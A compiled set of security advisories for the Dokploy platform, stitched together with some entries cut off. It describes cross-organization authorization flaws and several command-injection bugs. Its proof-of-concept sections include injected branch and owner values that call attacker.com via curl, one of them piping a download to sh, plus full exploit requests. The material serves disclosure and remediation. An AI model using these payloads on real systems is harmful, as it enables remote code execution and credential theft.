advisories.title: Multiple cross-organization authorization gaps from incomplete org-scope coverage: git-provider update mutations reassign another org's provider and disclose its decrypted OAuth secrets/app key, plus network sync/import over another org's SSH key and service duplicate/move across orgs

### Summary

The tRPC mutations github.update, gitlab.update, bitbucket.update and gitea.update are gated only by the RBAC check `withPermission("gitProviders","create")` and omit the per-resource organization-ownership assertion (`assertGitProviderAccess`) that every sibling procedure in the same routers enforces. They call `updateGitProvider(input.gitProviderId, { organizationId: ctx.session.activeOrganizationId })`, whose SQL is `UPDATE gitProvider SET ... WHERE gitProviderId = $id` with no organization constraint. An authenticated user who is owner/admin of their own organization can therefore pass another organization's gitProviderId/githubId and REASSIGN that victim git provider into the attacker's organization (and overwrite its fields). Once the provider belongs to the attacker's org, `github.one` (gated by `canViewGitProviderSecrets` = owner/admin of the owning org) returns the provider's DECRYPTED githubClientSecret, githubPrivateKey and githubWebhookSecret to the attacker - cross-organization theft of git credentials, plus loss/hijack of the victim's git integration.

### Details

## Affected / versions
Reproduced live on the released image `dokploy/dokploy:v0.30.10` (latest published 0.30.x; boot log "Running DokployVersion: v0.30.10"). Source HEAD v0.30.11 (clone d64ebed) carries byte-identical vulnerable code, verified against the v0.30.10 tag for both github.ts and git-provider.ts. The four `*.update` git-provider mutations lack the org-ownership assertion. Patched versions: none at time of writing. (git-provider secrets are stored in plaintext in the `github` table, so `github.one` returns them verbatim once the org check passes.)

## Technical details (file:line)

      // sibling procs all assert org ownership:
      one:                   assertGitProviderAccess(ctx.session, github.gitProvider)   // :31
      getGithubRepositories: assertGitProviderAccess(...)                               // :48
      getGithubBranches:     assertGitProviderAccess(...)                               // :56
      testConnection:        assertGitProviderAccess(...)                               // :96
      // update OMITS it:
      update: withPermission("gitProviders","create")        // :106  -- RBAC only, NO org assertion
        .mutation(async ({ input, ctx }) => {
          await updateGitProvider(input.gitProviderId, {
            name: input.name,
            organizationId: ctx.session.activeOrganizationId,  // <-- reassigns provider to the CALLER's org
          });
          await updateGithub(input.githubId, { ...input });    // <-- overwrites victim github row by id
        })

    packages/server/src/services/git-provider.ts
      export const updateGitProvider = async (gitProviderId, input) =>
        db.update(gitProvider).set({ ...input })
          .where(eq(gitProvider.gitProviderId, gitProviderId))  // <-- WHERE by id ONLY, no organizationId

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` - High (8.1). Network-reachable; requires only a standard authenticated user who is owner/admin of their own org (self-registration makes a user owner of their org, which holds `gitProviders:create`), so PR:L. High confidentiality (decrypted git OAuth client secret, GitHub App private key, webhook secret of another org) and high integrity (victim's provider reassigned to the attacker's org and overwritten). advisories.summary:
### Summary

The `patch.readRepoDirectories` tRPC procedure takes a `repoPath` string straight from the caller and runs `git ls-tree` inside it. The value is never confined to the caller's own patch-repo directory, so a member with read access to one service can point `repoPath` at any path on the host (or a managed server) and list the tracked files of the git repository there - for example another organization's deployed application source under `/etc/dokploy/applications/<other-app>/code`. It is cross-tenant information disclosure of directory and file names.


### Details

From `apps/dokploy/server/api/routers/patch.ts`:

```ts
readRepoDirectories: protectedProcedure
	.input(
		z.object({
			id: z.string().min(1),
			type: z.enum(["application", "compose"]),
			repoPath: z.string(),          // <-- used verbatim as the working directory
		}),
	)
	.query(async ({ input, ctx }) => {
		await checkServicePermissionAndAccess(ctx, input.id, {
			service: ["read"],
		});
		// serverId resolved from the service...
		return await readPatchRepoDirectory(input.repoPath, serverId);
	}),
```

And the sink in `packages/server/src/services/patch-repo.ts`:

```ts
export const readPatchRepoDirectory = async (repoPath: string, serverId?) => {
	const command = `cd ${quote([repoPath])} && git ls-tree -r --name-only HEAD`;
	// exec locally or on the remote server, parse stdout into a tree
};
```

`repoPath` is attacker-controlled and absolute. `quote()` (added for GHSA-56g6, which was a command-injection issue in this same function) blocks shell metacharacters, but the directory itself is still whatever the caller asks for. The authorization check (`service: ["read"]` on `input.id`) only proves the caller can read service `id`; it has no bearing on `repoPath`.

To make the cross-tenant effect concrete, a second tenant's deployed-application repository is simulated at the real path Dokploy uses, `/etc/dokploy/applications/victim-corp/code`, containing one file named `prod-database-credentials.txt`. The attacker has no relationship to that service.

Readable input:

```json
{"0":{"json":{"id":"4avF15a1L2z-mKxpKQON1","type":"application","repoPath":"/etc/dokploy/applications/victim-corp/code"}}}
```

```http

Host: 127.0.0.1:8020
Cookie: better-auth.session_token=YL6XrJByAf9fxICesnHBrHk7K3OEr7s2.TMuqwklJqI3S403Dqpk9fJgF4TeMf3AwR1IUcAKeLpw%3D
```

```http
[{"result":{"data":{"json":[{"name":"prod-database-credentials.txt","path":"prod-database-credentials.txt","type":"file","children":null}],"meta":{"values":{"0.children":["undefined"]},"v":1}}}}]
```

advisories.title: Saving the git source of an application or compose does not check access to the git provider: a member can point their service at another user's unshared GitHub/GitLab/Gitea/Bitbucket provider or SSH key and clone private repositories with it
advisories.summary:
### Summary

The endpoints that save the git source of an application (`application.saveGithubProvider`, `saveGitlabProvider`, `saveBitbucketProvider`, `saveGiteaProvider`, `saveGitProvider`, and `application.update`) and of a compose service (`compose.update`) only call `checkServicePermissionAndAccess(..., { service: ["create"] })`. They then write the posted `githubId`, `gitlabId`, `bitbucketId`, `giteaId` or `customGitSSHKeyId` straight into the row. Nothing checks that the caller may use that provider, that it belongs to the caller's organization, or that it is shared. The provider routers (`github.one`, `getGithubRepositories`, `getGithubBranches`, ...) do call `assertGitProviderAccess`, and `application.one` / `compose.one` call `canEditDeployGitSource` (added in PR #4570) but only to return a `hasGitProviderAccess = false` flag for the UI. At deploy time the clone helpers load the provider by id with no organization or ownership check and clone with its token, app credentials or private key. A member who may edit a service can therefore switch it to a provider that was not shared with them and deploy any repository that this provider's credentials can read. With the `static` build type the cloned files are served by the app's own nginx, so the member can read them.

Dokploy `canary`, `1048bcb113` (2026-11-09, the current HEAD; the cited files `application.ts`, `compose.ts`, `git-provider.ts`, `utils/providers/github.ts` and `services/application.ts` are identical upstream on 2026-11-11). Paths are under the repository root. Line numbers are for this commit.

Only `buildServerId` gets an extra check (`:766-773`). `...rest` goes to `updateApplication`.
- `apps/dokploy/server/api/routers/compose.ts:200-212` `update` (`apiUpdateCompose`, `packages/server/src/db/schema/compose.ts:274-281`, same `omit` of `serverId` and `environmentId` only): `updateCompose(input.composeId, input)` writes `githubId`, `gitlabId`, `bitbucketId`, `giteaId`, `customGitSSHKeyId` and `sourceType`. advisories.title: OS Command Injection via customGitBranch/customGitUrl in Deployment Pipeline
advisories.summary:
## Summary

The `saveGitProvider` tRPC mutation accepts user-controlled `customGitBranch` and `customGitUrl` values with **zero sanitization** (only `z.string()` validation). These values are directly interpolated into shell commands via template literals and executed via `child_process.exec()` during deployment, allowing any authenticated user to achieve **Remote Code Execution** on the Dokploy server.

## Vulnerability Details

### Sink: Shell Command Construction

**File:** `packages/server/src/utils/providers/git.ts`, line 79

```typescript
command += `if ! git clone --branch ${customGitBranch} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} --progress ${customGitUrl} ${outputPath}; then
    echo "❌ [ERROR] Fail to clone the repository ${customGitUrl}";
    exit 1;
fi`;
```

Both `customGitBranch` and `customGitUrl` are interpolated directly into a shell command string with no escaping.

### Source: User Input via tRPC API

**File:** `apps/dokploy/server/api/routers/application.ts`, lines 547-572

The `saveGitProvider` mutation accepts user input:

```typescript
.input(apiSaveGitProvider)  // Zod schema with z.string() only
```

**File:** `packages/server/src/db/schema/application.ts`, lines 495-509

```typescript
export const apiSaveGitProvider = z.object({
    // ...
    customGitBranch: z.string().optional(),  // No regex, no pattern, no sanitization
    customGitUrl: z.string().optional(),      // No regex, no pattern, no sanitization
    // ...
});
```

### Execution Path

**File:** `packages/server/src/services/application.ts`, lines 199-212

```typescript
const command = await cloneGitRepository(applicationEntity);
// ...
const commandWithLog = `(${command}) >> ${deployment.logPath} 2>&1`;
if (serverId) {
    await execAsyncRemote(serverId, commandWithLog);  // Executes via SSH on remote server
} else {
    await execAsync(commandWithLog);  // Executes via child_process.exec() locally
}
```

`execAsync` is `util.promisify(exec)` from `child_process`, which spawns a shell.

## Additional Injection Vectors

1. **Line 62:** `command += \`echo "Cloning Repo Custom ${customGitUrl} to ${outputPath}"\`` - `customGitUrl` containing `$(cmd)` or backticks would execute within double quotes
2. **Line 58:** `addHostToKnownHostsCommand(customGitUrl)` - domain extracted from URL is interpolated into `ssh-keyscan -p ${port} ${domain}` without escaping

## Authorization Weakness

The `saveGitProvider` mutation only checks organization membership - there is **no `checkServiceAccess` call** for "member" role users. Compare with `create` and `delete` which do check member permissions. This means any authenticated user in the organization (including restricted members) can set malicious git settings.

## Proof of Concept

**Step 1:** Save malicious git provider settings:
```bash
# Via tRPC API - saveGitProvider mutation
POST /api/trpc/application.saveGitProvider
{
    "applicationId": "<existing_app_id>",
    "customGitBranch": "main$(curl http://attacker.com/$(whoami))",
    "customGitUrl": "https://github.com/user/repo",
    "customGitOwner": "user"
}
```

**Step 2:** Trigger deployment:
```bash
POST /api/trpc/application.deploy
{"applicationId": "<same_app_id>"}
```

**Step 3:** The following shell command is constructed and executed:
```bash
git clone --branch main$(curl http://attacker.com/$(whoami)) --depth 1 --progress https://github.com/user/repo /path/to/output
```

The `$(curl ...)` payload executes, sending the server's username to the attacker's server.

## Impact

- **Remote Code Execution** with the privileges of the Dokploy server process (typically root in Docker-based deployments)
- **Full server compromise** - read/write any file, access all containers, steal credentials
- **Lateral movement** - if using remote servers via SSH (`execAsyncRemote`), commands also execute on those servers
- Any authenticated user (including restricted "member" role) can exploit this

## Suggested Fix

1. **Validate inputs*...

advisories.title: RCE via Command Injection in Git Provider Settings
advisories.summary:
## Information
- **Project:** Dokploy
- **Version:** v0.29.4
- **Severity:** Critical (10.0)
- **Vulnerability Type:** Command Injection (CWE-77)

## Description
The Dokploy server is vulnerable to command injection in the Git provider integration (GitHub, GitLab, Gitea, Bitbucket). The functions responsible for cloning repositories use string interpolation to construct shell commands. User-controlled fields such as `owner` and `repository` (for GitHub/Gitea) and `gitlabPathNamespace` (for GitLab) are not properly sanitized or validated against a strict regular expression before being passed to a shell execution environment.

## Code Analysis
In [packages/server/src/utils/providers/github.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/utils/providers/github.ts):
```typescript
const repoclone = `github.com/${owner}/${repository}.git`;
// ...
const cloneUrl = `https://oauth2:${token}@${repoclone}`;
// ...
command += `git clone --branch ${branch} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} ${cloneUrl} ${outputPath} --progress;`;
```
The `owner` and `repository` variables are directly interpolated into the `command` string. While `branch` is validated via regex in the Zod schema, `owner` and `repository` are only validated as strings.

In the database schema [packages/server/src/db/schema/application.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/db/schema/application.ts), the `apiSaveGithubProvider` schema lacks validation for these fields.

## Proof of Concept
1. Navigate to an Application's Git settings.
2. Set the `owner` field to: `myowner; curl http://attacker.com/$(whoami); #`
3. Trigger a deployment.
4. The server executes: `git clone ... https://oauth2:TOKEN@github.com/myowner; curl http://attacker.com/$(whoami); #/myrepo.git ...`
5. The injected command `curl` executes on the host.

## Impact
Full system compromise. An attacker can execute arbitrary commands on the host system with the privileges of the Dokploy process, potentially leading to secret theft, data exfiltration, or complete host takeover.

## Remediation
1. **Strict Validation**: Apply alphanumeric regex validation to `owner`, `repository`, and `gitlabPathNamespace` in the Zod schemas.
2. **Safe Argument Escaping**: Use a library like `shell-quote` to escape all arguments before command construction.
3. **Avoid Shell Interpolation**: Use Git SDKs or child processes with argument arrays instead of raw shell strings.

## How This Issue Differs from CVE-2026-45628

This vulnerability is a **distinct and separate** security issue from [CVE-2026-45628](https://nvd.nist.gov/vuln/detail/CVE-2026-45628). While both affect Dokploy and involve command injection, they target different code paths, require separate fixes, and have unique attack vectors.

### 1. Different Injection Point
- **CVE-2026-45628**: Primarily describes injection via **branch names** and **repository URLs** in the deployment pipeline.
- **This Report**: Identifies injection via the **`owner`** and **`repository`** fields (for GitHub/Gitea) and the **`gitlabPathNamespace`** field (for GitLab).

### 2. Different Affected Code Locations
- **CVE-2026-45628**: Focuses on the branch interpolation in files like `git.ts`, `github.ts`, `gitlab.ts`, and `bitbucket.ts`.
- **This Report**: Targets the URL construction logic in `github.ts` and `gitlab.ts` where the full clone URL is assembled using these specific, unsanitized namespace fields.

### 3. Different Validation Status
- **CVE-2026-45628**: Addresses the lack of validation for **branch** names.
- **This Report**: Reveals that while the `branch` field is now validated (partially addressing CVE-2026-45628), the `owner`, `repository`, and `gitlabPathNamespace` fields are **not** validated and lack any regex or sanitization.

advisories.title: Command Injection via Unescaped Git Branch Names in All Providers
advisories.summary:
## Summary

Dokploy has a command injection vulnerability in its git provider implementation. The `--branch` argument to `git clone` is interpolated directly into shell command strings without any escaping, allowing an authenticated user to inject arbitrary OS commands by setting a malicious branch name and triggering a deployment.

The vulnerable pattern exists across all git provider files, but the branch field consistently uses `z.string().optional()` with no character restrictions. This vulnerability was previously reported as GHSA-3frc-cfh9-ch2c (CVE-2026-45628) but remains unfixed in the current codebase.

## Affected Versions

TODO: Confirm affected version range. Vulnerability present in current `main` branch.

## Vulnerability Details

### Root Cause: Unescaped branch name interpolation in git clone commands

The `--branch` argument is interpolated without escaping into shell command strings. For example, in `packages/server/src/utils/providers/github.ts` line 170:

```typescript
command += `git clone --branch ${branch} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} ${cloneUrl} ${outputPath} --progress;`;
```

The branch field accepts arbitrary strings. Shell metacharacters such as `;`, `|`, `$()`, and backticks are interpreted by the shell when the command string is passed to `execAsync()`.

The same unescaped interpolation pattern exists across all other git provider files (`git.ts`, `gitlab.ts`, `bitbucket.ts`, `gitea.ts`).

The codebase has `shEscape()` in `packages/server/src/services/registry.ts` lines 14-17:

```typescript
function shEscape(s: string | undefined): string {
    if (!s) return "''";
    return `'${s.replace(/'/g, `'\\''`)}'`;
}
```

This function is not used in any of the git provider files.

### Attack Chain

- Attacker authenticates to Dokploy with project access
- Creates or updates an application via tRPC, setting the branch name to `main;curl attacker.com/x|sh;`
- Triggers a deployment
- Dokploy builds and executes: `git clone --branch main;curl attacker.com/x|sh; --depth 1 ...`
- The semicolons terminate the git command and execute the injected commands as the server user

## Proof of Concept

```bash
# Update application with injected branch name
curl -X POST "http://TARGET/api/trpc/application.update" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{
    "json": {
      "applicationId": "APP_ID",
      "sourceType": "github",
      "branch": "main;curl attacker.com/x|sh;"
    }
  }'

# Trigger deployment
curl -X POST "http://TARGET/api/trpc/application.deploy" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{"json": {"applicationId": "APP_ID"}}'

# The server executes:
#   git clone --branch main;curl attacker.com/x|sh; --depth 1 ...
# The semicolons terminate the git command and execute the injected commands.
```

## Impact

- Execute arbitrary OS commands as the Dokploy server process user (often root)
- Read/write any file on the host (private keys, database credentials, Docker socket)
- Pivot to other containers and services via the Docker socket
- Compromise all applications and databases managed by the Dokploy instance

## Suggested Remediation

Apply `shEscape()` to the branch name in the git provider files. For example, in `github.ts`:

```typescript
import { shEscape } from "../../services/registry";

// In the clone command:
command += `git clone --branch ${shEscape(branch)} --depth 1 ${enableSubmodules ? "--recurse-submodules" : ""} ${shEscape(cloneUrl)} ${shEscape(outputPath)} --progress;`;
```

The same fix should be applied across all provider files.

Alternatively, add Zod schema validation to reject shell metacharacters: `z.string().regex(/^[a-zA-Z0-9._\/-]+$/)`.

advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). In 0.26.6 and earlier, Dokploy contains a command injection vulnerability in the /docker-container-logs WebSocket endpoint. The tail and since parameters are not validated and are directly concatenated into shell commands, allowing authenticated users to execute arbitrary commands with root privileges.

advisories.title: Dokploy has Command Injection in its Service Operations
advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). Versions 0.26.6 and below have OS command injection through the appName parameter. 3 chained issues cause this problem: inadequate input sanitization, lack of schema validation and direct shell interpolation. User-controlled application names are passed through inadequate sanitization (cleanAppName function only replaces spaces and converts to lowercase) before being interpolated directly into shell commands executed via execAsync() and execAsyncRemote(). An authenticated attacker can inject shell metacharacters (e.g., ;, $(), backticks, |, &) in the appName field during application creation, which are then executed with server-level privileges when service operations (start, stop, remove, scale) are triggered. This issue has been resolved in version 0.26.7.

advisories.title: Dokploy: Remote Code Execution through Path Traversal
advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). In 0.26.5 and earlier, a critical path traversal vulnerability exists in Dokploy v0.26.5 that allows authenticated users to write arbitrary files to the filesystem during application deployment. When combined with Dokploy's remote server deployment feature, this vulnerability enables arbitrary file write to remote server filesystems, automatic remote code execution via cron jobs, complete server compromise, data exfiltration without user interaction, and persistent backdoor installation. This vulnerability bypasses all container isolation on remote server deployments.

advisories.title: Dokploy Vulnerable to Authenticated Remote Code Execution via Command Injection in Docker Container Terminal WebSocket Endpoint
advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). In versions prior to 0.26.6, a critical command injection vulnerability exists in Dokploy's WebSocket endpoint `/docker-container-terminal`. The `containerId` and `activeWay` parameters are directly interpolated into shell commands without sanitization, allowing authenticated attackers to execute arbitrary commands on the host server. Version 0.26.6 fixes the issue.

advisories.title: Dokploy uses hardcoded credentials in installation script, which could result in database access
advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). In versions prior to 0.26.6, a hardcoded credential in the provided installation script (located at https://dokploy.com/install.sh, line 154) uses a hardcoded password when creating the database container. This means that nearly all Dokploy installations use the same database credentials and could be compromised. Version 0.26.6 contains a patch for the issue.

advisories.title: Dokploy has a clickjacking vulnerability - Missing X-Frame-Options and CSP frame-ancestors headers
advisories.summary: Dokploy is a free, self-hostable Platform as a Service (PaaS). In versions prior to 0.26.6, the Dokploy web interface is vulnerable to Clickjacking attacks due to missing frame-busting headers. This allows attackers to embed Dokploy pages in malicious iframes and trick authenticated users into performing unintended actions. Version 0.26.6 patches the issue.
